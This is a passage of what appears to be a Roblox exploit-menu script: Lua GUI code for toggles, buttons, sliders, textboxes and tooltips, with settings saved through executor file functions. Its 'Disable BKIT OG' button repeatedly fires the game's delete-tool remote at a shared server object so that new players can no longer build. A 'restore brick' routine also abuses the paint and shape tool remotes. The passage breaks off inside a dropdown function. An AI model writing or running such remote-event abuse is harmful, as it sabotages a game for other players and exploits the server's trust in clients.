						local l = tick()
						repeat
							if tick() > l then
								l = tick() + (ws * 2)
								painttool.Script.Event:FireServer(
									block,
									Enum.NormalId.Top,
									getplrpos(),
									"both 🤝",
									Color3.fromRGB(192, 192, 192),
									"anchor",
									""
								)
							end
							task.wait()
						until block.Anchored and block.CFrame - block.Position == CFrame.new()
					end
				end
	
				if shapetool then
					local blockpos = block.Position
					blockpos = Vector3.new(blockpos.X % 4, blockpos.Y % 4, blockpos.Z % 4)
					blockpos = blockpos - Vector3.new(0.5, 0.5, 0.5)
	
					for i = 1, blockpos.X do
						shapetool.Script.Event:FireServer(block, Enum.NormalId.Left, block.Position, "increase")
						task.wait(0.15)
					end
	
					for i = 1, 3 - blockpos.X do
						shapetool.Script.Event:FireServer(block, Enum.NormalId.Right, block.Position, "increase")
						task.wait(0.15)
					end
	
					for i = 1, blockpos.Y do
						shapetool.Script.Event:FireServer(block, Enum.NormalId.Bottom, block.Position, "increase")
						task.wait(0.15)
					end
	
					for i = 1, 3 - blockpos.Y do
						shapetool.Script.Event:FireServer(block, Enum.NormalId.Top, block.Position, "increase")
						task.wait(0.15)
					end
	
					for i = 1, blockpos.Z do
						shapetool.Script.Event:FireServer(block, Enum.NormalId.Front, block.Position, "increase")
						task.wait(0.15)
					end
	
					for i = 1, 3 - blockpos.Z do
						shapetool.Script.Event:FireServer(block, Enum.NormalId.Back, block.Position, "increase")
						task.wait(0.15)
					end
				end
	
				return true
			end)
	
			if success and result == true then
				_G.SetButtonText("restorebrick", "Restored brick!", 1)
				return true
			elseif type(result) == "string" then
				_G.SetButtonText("restorebrick", result, 1)
				return false
			else
				_G.SetButtonText("restorebrick", "Failed!", 1)
				return false
			end
		end,
	})
	
	
	
	
	
	
	
	
	
	
	-- ====================================================================================================
	-- DISABLE BKIT OG
	-- ====================================================================================================
	_G.CreateButton({
		frame = "disablebkitog",
		groupbox = script,
		tooltip = "Disables B-Kit serversided in OG servers using delete tool. New players who gets B-Kit will no longer be able to build.",
		needsConfirm = true,
		confirmMessage = "Are you sure?",
		confirmWait = 1,
		afterMessage = "Disabled B-Kit!",
		errorMessage = "Failed!",
		afterMessageWait = 1,
		canClickDuringAfter = true,
		callback = function()
			local token = _G.SetButtonText("disablebkitog", "Processing...", 999)
			local success, err = pcall(function()
				local Players = game:GetService("Players")
				local LocalPlayer = Players.LocalPlayer
				local rs = game:GetService("ReplicatedStorage")
				local character = LocalPlayer.Character
				if not character then error("No character") end
	
				-- Refresh the delete tool first
				if shared.RefreshTool then
					shared.RefreshTool("Delete")
					task.wait(0.1)
				end
	
				local deleteTool = LocalPlayer.Backpack:FindFirstChild("Delete") or character:FindFirstChild("Delete")
				if not deleteTool then error("Delete tool needed!") end
	
				local hrp = character:FindFirstChild("HumanoidRootPart")
				if not hrp then error("No HumanoidRootPart") end
				local cube = rs:FindFirstChild("Cube")
				if not cube then error("No Cube in ReplicatedStorage") end
				local events = LocalPlayer.Backpack:FindFirstChild("Events")
				if not events then error("No Events in Backpack") end
				local startTime = tick()
				local maxTime = 5
				while tick() - startTime < maxTime and not token.cancelled do
					if not rs:FindFirstChild("Cube") then
						return true
					end
					events:FireServer(hrp.Position, Enum.NormalId.Top, cube, Color3.new(), "Smooth")
					task.wait(0.01)
				end
				error("Timeout - Cube not deleted")
			end)
			if success then
				_G.SetButtonText("disablebkitog", "Disabled B-Kit!", 1)
				_G.Notify("B-Kit disabled successfully!", 3)
				return true
			else
				_G.SetButtonText("disablebkitog", err or "Failed!", 1)
				_G.Notify("Failed to disable B-Kit!", 3)
				return false
			end
		end,
	})
end;
task.spawn(C_24f);
-- StarterGui.T5784YHRGE89ES98T.Tooltip.tooltipScript
local function C_2b2()
local script = G2L["2b2"];
	local function getScreenGui()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	
	local screenGui = getScreenGui()
	if not screenGui then return end
	
	local UserInputService = game:GetService("UserInputService")
	local RunService = game:GetService("RunService")
	local TextService = game:GetService("TextService")
	
	local tooltip = screenGui:FindFirstChild("Tooltip")
	if not tooltip then return end
	
	local label = tooltip:FindFirstChild("text")
	if not label then return end
	
	tooltip.Visible = false
	
	local maxWidth = 250
	local offsetX = 12
	local offsetY = 12
	
	local function updateTooltipSize()
		local text = label.Text
		local textSize = TextService:GetTextSize(
			text,
			label.TextSize,
			label.Font,
			Vector2.new(maxWidth - 10, math.huge)
		)
		local width = math.min(textSize.X + 10, maxWidth)
		local height = textSize.Y + 10
		tooltip.Size = UDim2.new(0, width, 0, height)
	end
	
	local function updatePosition()
		local mousePos = UserInputService:GetMouseLocation()
		local guiInset = game:GetService("GuiService"):GetGuiInset()
	
		local uiScale = screenGui:FindFirstChildOfClass("UIScale")
		local scale = uiScale and uiScale.Scale or 1
	
		tooltip.Position = UDim2.new(0, (mousePos.X - guiInset.X + offsetX) / scale, 0, (mousePos.Y - guiInset.Y + offsetY) / scale)
	end
	
	UserInputService.TouchMoved:Connect(updatePosition)
	UserInputService.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement then
			updatePosition()
		end
	end)
	
	RunService.RenderStepped:Connect(updatePosition)
	
	label:GetPropertyChangedSignal("Text"):Connect(function()
		updateTooltipSize()
	end)
	
	updateTooltipSize()
	
	local hideTask = nil
	
	function _G.ShowTooltip(text)
		label.Text = text
		tooltip.Visible = true
	end
	
	function _G.HideTooltip()
		tooltip.Visible = false
	end
end;
task.spawn(C_2b2);
-- StarterGui.T5784YHRGE89ES98T.MasterScripts.ToggleMaster
local function C_2ba()
local script = G2L["2ba"];
	-- ToggleMaster Script
	local function getScreenGui()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	
	local screenGui = getScreenGui()
	if not screenGui then return end
	
	local UserInputService = game:GetService("UserInputService")
	local HttpService = game:GetService("HttpService")
	
	local colorFrame = screenGui:FindFirstChild("Color")
	if not colorFrame then return end
	
	local targetColor = colorFrame.BackgroundColor3
	local toggleStates = {}
	
	_G.ConfigData = _G.ConfigData or {}
	
	local CONFIG_FILE = "myconfig.json"
	
	local function saveConfig()
		pcall(function()
			writefile(CONFIG_FILE, HttpService:JSONEncode(_G.ConfigData))
		end)
	end
	
	local function loadConfig()
		local success, data = pcall(function()
			return readfile(CONFIG_FILE)
		end)
		if success and data then
			_G.ConfigData = HttpService:JSONDecode(data)
		end
	end
	
	loadConfig()
	
	local allToggles = {}
	local allButtonToggles = {}
	
	local function updateAllColors()
		targetColor = colorFrame.BackgroundColor3
		for _, toggle in pairs(allToggles) do
			toggle.update()
		end
		for _, buttonToggle in pairs(allButtonToggles) do
			buttonToggle.update()
		end
	end
	
	colorFrame:GetPropertyChangedSignal("BackgroundColor3"):Connect(updateAllColors)
	
	local function CreateToggle(config)
		local frameName = config.frame
		local groupboxScript = config.groupbox
		local tooltipText = config.tooltip
		local callback = config.callback
	
		local frame = groupboxScript.Parent:FindFirstChild(frameName)
		if not frame then return end
	
		local button = frame:FindFirstChild("button")
		if not button then return end
	
		local toggleFrame = button:FindFirstChild("toggleFrame")
		if not toggleFrame then return end
	
		local outlineStroke = toggleFrame:FindFirstChild("outlineStroke")
		if not outlineStroke then return end
	
		local toggleFade = toggleFrame:FindFirstChild("toggleFade")
	
		local isToggled = _G.ConfigData[frameName] or false
		local isHovering = false
		toggleStates[button] = isToggled
		
		-- Call callback on load if toggled is true
		if isToggled and callback then
			task.spawn(function()
				callback(true)
			end)
		end
	
		local function updateVisuals()
			if isToggled then
				toggleFrame.BackgroundColor3 = targetColor
				toggleFrame.BorderColor3 = targetColor
				outlineStroke.Color = targetColor
				outlineStroke.Thickness = 1
				outlineStroke.Transparency = isHovering and 0 or 0.5
				if toggleFade then toggleFade.Visible = false end
			else
				toggleFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
				toggleFrame.BorderColor3 = Color3.fromRGB(50, 50, 50)
				if toggleFade then toggleFade.Visible = true end
				if isHovering then
					outlineStroke.Color = targetColor
					outlineStroke.Thickness = 1
					outlineStroke.Transparency = 0
				else
					outlineStroke.Color = Color3.fromRGB(0, 0, 0)
					outlineStroke.Thickness = 2
					outlineStroke.Transparency = 0
				end
			end
	
			outlineStroke.ZIndex = isHovering and 99 or 1
		end
	
		updateVisuals()
	
		table.insert(allToggles, {update = updateVisuals})
	
		button.MouseButton1Click:Connect(function()
			isToggled = not isToggled
			toggleStates[button] = isToggled
			_G.ConfigData[frameName] = isToggled
			updateVisuals()
			saveConfig()
			if callback then
				callback(isToggled)
			end
		end)
	
		button.MouseEnter:Connect(function()
			isHovering = true
			outlineStroke.Color = targetColor
			outlineStroke.Thickness = 1
			outlineStroke.Transparency = 0
			outlineStroke.ZIndex = 99
			if tooltipText and _G.ShowTooltip then
				local mousePos = UserInputService:GetMouseLocation()
				local guiInset = game:GetService("GuiService"):GetGuiInset()
				local uiScale = screenGui:FindFirstChildOfClass("UIScale")
				local scale = uiScale and uiScale.Scale or 1
				local tooltip = screenGui:FindFirstChild("Tooltip")
				if tooltip then
					tooltip.Position = UDim2.new(0, (mousePos.X - guiInset.X + 12) / scale, 0, (mousePos.Y - guiInset.Y + 12) / scale)
				end
				_G.ShowTooltip(tooltipText)
			end
		end)
	
		button.MouseLeave:Connect(function()
			isHovering = false
			updateVisuals()
			if _G.HideTooltip then
				_G.HideTooltip()
			end
		end)
	end
	
	local function CreateButtonToggle(config)
		local frameName = config.frame
		local groupboxScript = config.groupbox
		local tooltipText = config.tooltip
		local callback = config.callback
		local toggledText = config.toggledText
		local toggledTextColor = config.toggledTextColor or targetColor
	
		local frame = groupboxScript.Parent:FindFirstChild(frameName)
		if not frame then return end
	
		local button = frame:FindFirstChild("button")
		if not button then return end
	
		local outlineStroke = button:FindFirstChild("outlineStroke", true)
		local text = button:FindFirstChild("text")
	
		if not text then return end
	
		local isToggled = _G.ConfigData[frameName] or false
		local originalText = text.Text
		local originalTextColor = text.TextColor3
		local isHovering = false
	
		local function updateVisuals()
			local currentToggledTextColor = config.toggledTextColor or targetColor
			if isToggled then
				button.BackgroundColor3 = targetColor
				button.BorderColor3 = targetColor
				text.Text = toggledText or originalText
				text.TextColor3 = currentToggledTextColor
				if outlineStroke and outlineStroke:IsA("UIStroke") then
					outlineStroke.Color = targetColor
					outlineStroke.Transparency = isHovering and 0 or 0.5
					outlineStroke.Thickness = 1
					outlineStroke.ZIndex = isHovering and 99 or 99
				end
			else
				button.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
				button.BorderColor3 = Color3.fromRGB(50, 50, 50)
				text.Text = originalText
				text.TextColor3 = originalTextColor
				if outlineStroke and outlineStroke:IsA("UIStroke") then
					if isHovering then
						outlineStroke.Color = targetColor
						outlineStroke.Thickness = 1
						outlineStroke.Transparency = 0
						outlineStroke.ZIndex = 99
					else
						outlineStroke.Color = Color3.fromRGB(0, 0, 0)
						outlineStroke.Transparency = 0
						outlineStroke.Thickness = 2
						outlineStroke.ZIndex = 1
					end
				end
			end
		end
	
		updateVisuals()
	
		table.insert(allButtonToggles, {update = updateVisuals})
	
		button.MouseButton1Down:Connect(function()
			if not isToggled then
				text.TextColor3 = targetColor
			end
		end)
	
		button.MouseButton1Up:Connect(function()
			if not isToggled then
				text.TextColor3 = originalTextColor
			end
		end)
	
		button.MouseButton1Click:Connect(function()
			isToggled = not isToggled
			_G.ConfigData[frameName] = isToggled
			updateVisuals()
			saveConfig()
			if callback then
				callback(isToggled)
			end
		end)
	
		if outlineStroke and outlineStroke:IsA("UIStroke") then
			button.MouseEnter:Connect(function()
				isHovering = true
				outlineStroke.Color = targetColor
				outlineStroke.Thickness = 1
				outlineStroke.Transparency = 0
				outlineStroke.ZIndex = 99
				if tooltipText and _G.ShowTooltip then
					local mousePos = UserInputService:GetMouseLocation()
					local guiInset = game:GetService("GuiService"):GetGuiInset()
					local uiScale = screenGui:FindFirstChildOfClass("UIScale")
					local scale = uiScale and uiScale.Scale or 1
					local tooltip = screenGui:FindFirstChild("Tooltip")
					if tooltip then
						tooltip.Position = UDim2.new(0, (mousePos.X - guiInset.X + 12) / scale, 0, (mousePos.Y - guiInset.Y + 12) / scale)
					end
					_G.ShowTooltip(tooltipText)
				end
			end)
	
			button.MouseLeave:Connect(function()
				isHovering = false
				updateVisuals()
				if _G.HideTooltip then
					_G.HideTooltip()
				end
			end)
		end
	end
	
	_G.CreateToggle = CreateToggle
	_G.CreateButtonToggle = CreateButtonToggle
end;
task.spawn(C_2ba);
-- StarterGui.T5784YHRGE89ES98T.MasterScripts.ButtonMaster
local function C_2bb()
local script = G2L["2bb"];
	-- ButtonMaster Script
	local function getScreenGui()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	
	local screenGui = getScreenGui()
	if not screenGui then return end
	
	local UserInputService = game:GetService("UserInputService")
	local RunService = game:GetService("RunService")
	
	local colorFrame = screenGui:FindFirstChild("Color")
	if not colorFrame then return end
	
	local targetColor = colorFrame.BackgroundColor3
	
	local function CreateButton(config)
		local frameName = config.frame
		local groupboxScript = config.groupbox
		local tooltipText = config.tooltip
		local callback = config.callback
		local needsConfirm = config.needsConfirm or false
		local confirmMessage = config.confirmMessage or "Are you sure?"
		local confirmWait = config.confirmWait or 1
		local afterMessage = config.afterMessage
		local afterMessageWait = config.afterMessageWait or 2
		local canClickDuringAfter = config.canClickDuringAfter or false
		local errorMessage = config.errorMessage
		local holdTime = config.holdtime
		local holdText = config.holdtext
		local holdVisual = config.holdvisual or false
		local holdTextColor = config.holdtextcolor
	
		local frame = groupboxScript.Parent:FindFirstChild(frameName)
		if not frame then return end
	
		local button = frame:FindFirstChild("button")
		if not button then return end
	
		local outlineStroke = button:FindFirstChild("outlineStroke", true)
		local text = button:FindFirstChild("text")
	
		if not text then return end
	
		local originalText = text.Text
		local originalTextColor = text.TextColor3
		local isConfirming = false
		local confirmTask = nil
		local isProcessing = false
	
		local holding = false
		local holdProgress = 0
		local holdConnection = nil
		local fillBar = button:FindFirstChild("fillbar")
	
		local holdColor = targetColor
		if holdTextColor then
			if holdTextColor == "frameColor" then
				holdColor = targetColor
			else
				local r, g, b = holdTextColor:match("(%d+),%s*(%d+),%s*(%d+)")
				if r and g and b then
					holdColor = Color3.fromRGB(tonumber(r), tonumber(g), tonumber(b))
				end
			end
		end
	
		local function stopHold()
			holding = false
			if holdConnection then
				holdConnection:Disconnect()
				holdConnection = nil
			end
			holdProgress = 0
			if fillBar and holdVisual then
				fillBar.Size = UDim2.new(0, 0, 1, 0)
			end
			text.Text = originalText
			text.TextColor3 = originalTextColor
		end
	
		local function executeCallback()
			isProcessing = true
			local success = true
			if callback then
				local result = callback()
				if result ~= nil then
					success = result
				end
			end
	
			local messageToShow = success and afterMessage or errorMessage
	
			if messageToShow then
				local displayText = messageToShow
				if messageToShow:find("%%%.%df") then
					local countdownTask
					countdownTask = task.spawn(function()
						for i = afterMessageWait, 0, -0.1 do
							if not isProcessing then break end
							text.Text = displayText:gsub("(%%%.%df)", function(match)
								return string.format(match, i)
							end)
							task.wait(0.1)
						end
					end)
				else
					text.Text = displayText
				end
				text.TextColor3 = targetColor
				task.delay(afterMessageWait, function()
					if not canClickDuringAfter then
						isProcessing = false
					end
					text.Text = originalText
					text.TextColor3 = originalTextColor
				end)
			else
				isProcessing = false
			end
		end
	
		button.MouseButton1Down:Connect(function()
			if isProcessing and not canClickDuringAfter then return end
	
			if holdTime then
				holding = true
				holdProgress = 0
				if holdText then
					text.Text = holdText
				end
				text.TextColor3 = holdColor
	
				holdConnection = RunService.RenderStepped:Connect(function(dt)
					if not holding then return end
					holdProgress = holdProgress + (dt / holdTime)
					holdProgress = math.clamp(holdProgress, 0, 1)
	
					if fillBar and holdVisual then
						fillBar.Size = UDim2.new(holdProgress, 0, 1, 0)
					end
	
					if holdText and holdText:find("%%%.%df") then
						local remaining = math.max(0, holdTime - (holdProgress * holdTime))
						text.Text = holdText:gsub("(%%%.%df)", function(match)
							return string.format(match, remaining)
						end)
					end
	
					if holdProgress >= 1 then
						stopHold()
						if needsConfirm then
							isConfirming = true
							text.Text = confirmMessage
							text.TextColor3 = targetColor
							confirmTask = task.delay(confirmWait, function()
								isConfirming = false
								text.Text = originalText
								text.TextColor3 = originalTextColor
							end)
						else
							executeCallback()
						end
					end
				end)
			else
				text.TextColor3 = targetColor
			end
		end)
	
		button.MouseButton1Up:Connect(function()
			if holdTime then
				stopHold()
			else
				if not isConfirming and not isProcessing then
					text.TextColor3 = originalTextColor
				end
			end
		end)
	
		button.MouseLeave:Connect(function()
			if holdTime then
				stopHold()
			else
				if not isConfirming and not isProcessing then
					text.TextColor3 = originalTextColor
				end
			end
		end)
	
		button.MouseButton1Click:Connect(function()
			if holdTime then return end
			if isProcessing and not canClickDuringAfter then return end
	
			if needsConfirm then
				if isConfirming then
					if confirmTask then task.cancel(confirmTask) end
					isConfirming = false
					text.Text = originalText
					text.TextColor3 = originalTextColor
					executeCallback()
				else
					isConfirming = true
					text.Text = confirmMessage
					text.TextColor3 = targetColor
					confirmTask = task.delay(confirmWait, function()
						isConfirming = false
						text.Text = originalText
						text.TextColor3 = originalTextColor
					end)
				end
			else
				executeCallback()
			end
		end)
	
		if outlineStroke and outlineStroke:IsA("UIStroke") then
			local originalColor = outlineStroke.Color
			local originalThickness = outlineStroke.Thickness
			local originalTransparency = outlineStroke.Transparency
			outlineStroke.ZIndex = 1
	
			button.MouseEnter:Connect(function()
				outlineStroke.Color = targetColor
				outlineStroke.Thickness = 1
				outlineStroke.Transparency = 0
				outlineStroke.ZIndex = 99
				if tooltipText and _G.ShowTooltip then
					local mousePos = UserInputService:GetMouseLocation()
					local guiInset = game:GetService("GuiService"):GetGuiInset()
					local uiScale = screenGui:FindFirstChildOfClass("UIScale")
					local scale = uiScale and uiScale.Scale or 1
					local tooltip = screenGui:FindFirstChild("Tooltip")
					if tooltip then
						tooltip.Position = UDim2.new(0, (mousePos.X - guiInset.X + 12) / scale, 0, (mousePos.Y - guiInset.Y + 12) / scale)
					end
					_G.ShowTooltip(tooltipText)
				end
			end)
	
			button.MouseLeave:Connect(function()
				outlineStroke.Color = originalColor
				outlineStroke.Thickness = originalThickness
				outlineStroke.Transparency = originalTransparency
				outlineStroke.ZIndex = 1
				if _G.HideTooltip then
					_G.HideTooltip()
				end
			end)
		end
	end
	
	_G.CreateButton = CreateButton
	
	-- Store active cancel tokens per frame
	local activeTokens = {}
	
	_G.SetButtonText = function(frameName, message, duration)
		duration = duration or 2
	
		-- Cancel previous token for this frame
		if activeTokens[frameName] then
			activeTokens[frameName].cancelled = true
		end
	
		-- Create new cancel token
		local cancelToken = {cancelled = false}
		activeTokens[frameName] = cancelToken
	
		-- Find all buttons with this frame name
		for _, descendant in pairs(screenGui:GetDescendants()) do
			if descendant.Name == frameName and descendant:IsA("Frame") then
				local button = descendant:FindFirstChild("button")
				if button then
					local text = button:FindFirstChild("text")
					if text then
						local originalText = text.Text
						local originalColor = text.TextColor3
	
						text.Text = message
						text.TextColor3 = targetColor
	
						task.delay(duration, function()
							if not cancelToken.cancelled then
								text.Text = originalText
								text.TextColor3 = originalColor
								activeTokens[frameName] = nil
							end
						end)
						break
					end
				end
			end
		end
	
		return cancelToken
	end
end;
task.spawn(C_2bb);
-- StarterGui.T5784YHRGE89ES98T.MasterScripts.TextboxMaster
local function C_2bc()
local script = G2L["2bc"];
	-- TextboxMaster Script
	local function getScreenGui()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	local screenGui = getScreenGui()
	if not screenGui then return end
	local UserInputService = game:GetService("UserInputService")
	local HttpService = game:GetService("HttpService")
	local colorFrame = screenGui:FindFirstChild("Color")
	if not colorFrame then return end
	local targetColor = colorFrame.BackgroundColor3
	
	local allTextboxes = {}
	
	local function updateAllColors()
		targetColor = colorFrame.BackgroundColor3
		for _, textbox in pairs(allTextboxes) do
			textbox.update()
		end
	end
	
	colorFrame:GetPropertyChangedSignal("BackgroundColor3"):Connect(updateAllColors)
	
	_G.ConfigData = _G.ConfigData or {}
	local CONFIG_FILE = "myconfig.json"
	local function saveConfig()
		pcall(function()
			writefile(CONFIG_FILE, HttpService:JSONEncode(_G.ConfigData))
		end)
	end
	local function loadConfig()
		local success, data = pcall(function()
			return readfile(CONFIG_FILE)
		end)
		if success and data then
			_G.ConfigData = HttpService:JSONDecode(data)
		end
	end
	loadConfig()
	local function CreateTextbox(config)
		local frameName = config.frame
		local textboxName = config.textboxname
		local tooltipText = config.tooltip
		local textboxColor = config.textboxcolor
		local hoverColor = config.hovercolor
		local callback = config.callback
		local frame = screenGui:FindFirstChild(frameName, true)
		if not frame then return end
		local textboxFrame = frame:FindFirstChild(textboxName)
		if not textboxFrame then return end
		local textbox = textboxFrame:FindFirstChild("textbox")
		if not textbox or not textbox:IsA("TextBox") then return end
		local outlineStroke = textboxFrame:FindFirstChild("outlineStroke", true)
	
		local function getTextboxColor()
			if textboxColor then
				if textboxColor == "frameColor" then
					return targetColor
				else
					local r, g, b = textboxColor:match("(%d+),%s*(%d+),%s*(%d+)")
					if r and g and b then
						return Color3.fromRGB(tonumber(r), tonumber(g), tonumber(b))
					end
				end
			end
			return nil
		end
	
		local function updateTextboxColor()
			local color = getTextboxColor()
			if color then
				textbox.TextColor3 = color
				textbox.PlaceholderColor3 = color
			end
		end
	
		updateTextboxColor()
		table.insert(allTextboxes, {update = updateTextboxColor})
	
		local configKey = frameName .. "_" .. textboxName
		if _G.ConfigData[configKey] then
			textbox.Text = _G.ConfigData[configKey]
		end
		textbox.FocusLost:Connect(function()
			_G.ConfigData[configKey] = textbox.Text
			saveConfig()
			if callback then
				callback(textbox.Text)
			end
		end)
		if hoverColor and outlineStroke and outlineStroke:IsA("UIStroke") then
			local originalColor = outlineStroke.Color
			local originalThickness = outlineStroke.Thickness
			local originalTransparency = outlineStroke.Transparency
			outlineStroke.ZIndex = 1
			local isHovering = false
			local isFocused = false
			local function updateStroke()
				if isFocused or isHovering then
					outlineStroke.Color = targetColor
					outlineStroke.Thickness = 1
					outlineStroke.Transparency = 0
					outlineStroke.ZIndex = 99
				else
					outlineStroke.Color = originalColor
					outlineStroke.Thickness = originalThickness
					outlineStroke.Transparency = originalTransparency
					outlineStroke.ZIndex = 1
				end
			end
			textbox.Focused:Connect(function()
				isFocused = true
				updateStroke()
			end)
			textbox.FocusLost:Connect(function()
				isFocused = false
				updateStroke()
			end)
			textbox.MouseEnter:Connect(function()
				isHovering = true
				updateStroke()
				if tooltipText and _G.ShowTooltip then
					local mousePos = UserInputService:GetMouseLocation()
					local guiInset = game:GetService("GuiService"):GetGuiInset()
					local uiScale = screenGui:FindFirstChildOfClass("UIScale")
					local scale = uiScale and uiScale.Scale or 1
					local tooltip = screenGui:FindFirstChild("Tooltip")
					if tooltip then
						tooltip.Position = UDim2.new(0, (mousePos.X - guiInset.X + 12) / scale, 0, (mousePos.Y - guiInset.Y + 12) / scale)
					end
					_G.ShowTooltip(tooltipText)
				end
			end)
			textbox.MouseLeave:Connect(function()
				isHovering = false
				updateStroke()
				if _G.HideTooltip then
					_G.HideTooltip()
				end
			end)
		end
	end
	_G.CreateTextbox = CreateTextbox
end;
task.spawn(C_2bc);
-- StarterGui.T5784YHRGE89ES98T.MasterScripts.SliderMaster
local function C_2bd()
local script = G2L["2bd"];
	-- SliderMaster Script
	local function getScreenGui()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	
	local screenGui = getScreenGui()
	if not screenGui then return end
	
	local UserInputService = game:GetService("UserInputService")
	local RunService = game:GetService("RunService")
	local HttpService = game:GetService("HttpService")
	
	local colorFrame = screenGui:FindFirstChild("Color")
	if not colorFrame then return end
	
	local targetColor = colorFrame.BackgroundColor3
	
	local allSliders = {}
	
	local function updateAllColors()
		targetColor = colorFrame.BackgroundColor3
		for _, slider in pairs(allSliders) do
			slider.update()
		end
	end
	
	colorFrame:GetPropertyChangedSignal("BackgroundColor3"):Connect(updateAllColors)
	
	_G.ConfigData = _G.ConfigData or {}
	
	local CONFIG_FILE = "myconfig.json"
	
	local function saveConfig()
		pcall(function()
			writefile(CONFIG_FILE, HttpService:JSONEncode(_G.ConfigData))
		end)
	end
	
	local function loadConfig()
		local success, data = pcall(function()
			return readfile(CONFIG_FILE)
		end)
		if success and data then
			_G.ConfigData = HttpService:JSONDecode(data)
		end
	end
	
	loadConfig()
	
	local function CreateSlider(config)
		local frameName = config.frame
		local groupboxScript = config.groupbox
		local tooltipText = config.tooltip
		local callback = config.callback
		local minValue = config.minvalue or 0
		local maxValue = config.maxvalue
		local highestValue = config.highestvalue or maxValue
		local decimalPlaces = config.decimalplaces or 0
		local snap = config.snap or false
		local defaultValue = config.default
	
		if not maxValue then return end
	
		local frame = groupboxScript.Parent:FindFirstChild(frameName)
		if not frame then return end
	
		local button = frame:FindFirstChild("button")
		if not button then return end
	
		local sliderFrame = button:FindFirstChild("sliderFrame")
		if not sliderFrame then return end
	
		local fillBar = sliderFrame:FindFirstChild("fillbar")
		local text = button:FindFirstChild("text")
		local outlineStroke = sliderFrame:FindFirstChild("outlineStroke", true)
	
		if not fillBar or not text then return end
	
		fillBar.BackgroundColor3 = colorFrame.BackgroundColor3
	
		local function updateFillBarColor()
			fillBar.BackgroundColor3 = colorFrame.BackgroundColor3
		end
	
		table.insert(allSliders, {update = updateFillBarColor})
	
		local dragging = false
		local currentValue = _G.ConfigData[frameName]
	
		if not currentValue then
			currentValue = defaultValue or minValue
			_G.ConfigData[frameName] = currentValue
			saveConfig()
		end
	
		local function formatValue(value)
			if decimalPlaces == math.huge then
				return tostring(value)
			else
				return string.format("%." .. decimalPlaces .. "f", value)
			end
		end
	
		local function updateSlider(value)
			value = math.clamp(value, minValue, maxValue)
	
			if snap then
				local snapIncrement = 10 ^ -decimalPlaces
				value = math.floor(value / snapIncrement + 0.5) * snapIncrement
			end
	
			if value >= maxValue and highestValue > maxValue then
				value = highestValue
			end
	
			currentValue = value
	
			local percentage = (value - minValue) / (maxValue - minValue)
			fillBar.Size = UDim2.new(math.clamp(percentage, 0, 1), 0, 1, 0)
	
			if value >= maxValue and highestValue == math.huge then
				text.Text = formatValue(minValue) .. " / inf"
			else
				text.Text = formatValue(value) .. " / " .. formatValue(maxValue)
			end
	
			_G.ConfigData[frameName] = value
			saveConfig()
	
			if callback then
				callback(value)
			end
		end
	
		local function updateFromMouse(input)
			local pos = sliderFrame.AbsolutePosition
			local size = sliderFrame.AbsoluteSize
			local mouseX = input.Position.X
	
			local percentage = math.clamp((mouseX - pos.X) / size.X, 0, 1)
			local value = minValue + (percentage * (maxValue - minValue))
	
			updateSlider(value)
		end
	
		sliderFrame.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				dragging = true
				updateFromMouse(input)
			end
		end)
	
		sliderFrame.InputEnded:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				dragging = false
			end
		end)
	
		UserInputService.InputChanged:Connect(function(input)
			if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
				updateFromMouse(input)
			end
		end)
	
		if outlineStroke and outlineStroke:IsA("UIStroke") then
			local originalColor = outlineStroke.Color
			local originalThickness = outlineStroke.Thickness
			local originalTransparency = outlineStroke.Transparency
			outlineStroke.ZIndex = 1
	
			sliderFrame.MouseEnter:Connect(function()
				outlineStroke.Color = targetColor
				outlineStroke.Thickness = 1
				outlineStroke.Transparency = 0
				outlineStroke.ZIndex = 99
				if tooltipText and _G.ShowTooltip then
					local mousePos = UserInputService:GetMouseLocation()
					local guiInset = game:GetService("GuiService"):GetGuiInset()
					local uiScale = screenGui:FindFirstChildOfClass("UIScale")
					local scale = uiScale and uiScale.Scale or 1
					local tooltip = screenGui:FindFirstChild("Tooltip")
					if tooltip then
						tooltip.Position = UDim2.new(0, (mousePos.X - guiInset.X + 12) / scale, 0, (mousePos.Y - guiInset.Y + 12) / scale)
					end
					_G.ShowTooltip(tooltipText)
				end
			end)
	
			sliderFrame.MouseLeave:Connect(function()
				outlineStroke.Color = originalColor
				outlineStroke.Thickness = originalThickness
				outlineStroke.Transparency = originalTransparency
				outlineStroke.ZIndex = 1
				if _G.HideTooltip then
					_G.HideTooltip()
				end
			end)
		end
	
		updateSlider(currentValue)
	end
	
	_G.CreateSlider = CreateSlider
end;
task.spawn(C_2bd);
-- StarterGui.T5784YHRGE89ES98T.MasterScripts.DropdownMaster
local function C_2be()
local script = G2L["2be"];
	local function getScreenGui()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	local screenGui = getScreenGui()
	if not screenGui then return end
	local Players = game:GetService("Players")
	local Teams = game:GetService("Teams")
	local UserInputService = game:GetService("UserInputService")
	local HttpService = game:GetService("HttpService")
	local colorFrame = screenGui:FindFirstChild("Color")
	if not colorFrame then return end
	local targetColor = colorFrame.BackgroundColor3
	
	local function updateAllColors()
		targetColor = colorFrame.BackgroundColor3
	end
	
	colorFrame:GetPropertyChangedSignal("BackgroundColor3"):Connect(updateAllColors)
	
	_G.ConfigData = _G.ConfigData or {}
	local CONFIG_FILE = "myconfig.json"
	local function saveConfig()
		pcall(function()
			writefile(CONFIG_FILE, HttpService:JSONEncode(_G.ConfigData))
		end)
	end
	local function loadConfig()
		local success, data = pcall(function()
			return readfile(CONFIG_FILE)
		end)
		if success and data then
			_G.ConfigData = HttpService:JSONDecode(data)
		end
	end
	loadConfig()
	local cachedThumbs = {}
	local function getThumb(userId)
